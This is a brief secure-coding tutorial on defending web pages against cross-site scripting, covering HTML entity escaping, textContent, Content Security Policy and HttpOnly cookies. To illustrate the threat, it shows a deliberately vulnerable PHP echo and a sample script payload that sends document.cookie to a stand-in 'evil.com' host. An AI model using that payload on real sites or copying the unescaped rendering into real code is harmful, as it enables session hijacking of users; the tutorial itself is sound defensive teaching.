Web Defense: Stopping XSS 💉🛡️

Neutralize Cross-Site Scripting. Learn context-aware HTML entity sanitization and Content Security Policy.

What is Cross-Site Scripting (XSS)?

XSS occurs when an application accepts user text (like a comment or username) and renders it onto a web page without sanitization, allowing an attacker to inject and execute arbitrary JavaScript in other users' browsers.

// ❌ DANGEROUS: Renders raw user comment directly into HTML
echo "<div class='comment'>" . $_POST['comment'] . "</div>";

// If comment contains: <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
// The visitor's browser executes the script and leaks their session cookie!

The First Shield: Context-Aware Output Escaping

Convert dangerous executable markup characters into harmless, inert HTML entities before rendering:

< ➔ &lt;
> ➔ &gt;
" ➔ &quot;
& ➔ &amp;
// ✅ Secure PHP Rendering:
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');

// ✅ Secure Client JavaScript:
div.textContent = comment; // (Never use innerHTML for user data!)

Defense in Depth: CSP & HttpOnly Cookies

  • Content Security Policy (CSP): HTTP response header telling the browser to strictly block any inline scripts that do not match an approved cryptographic nonce or domain.
  • HttpOnly Cookie Flag: Tells the browser that client-side JavaScript (`document.cookie`) has zero access to session cookies, neutralizing cookie theft!
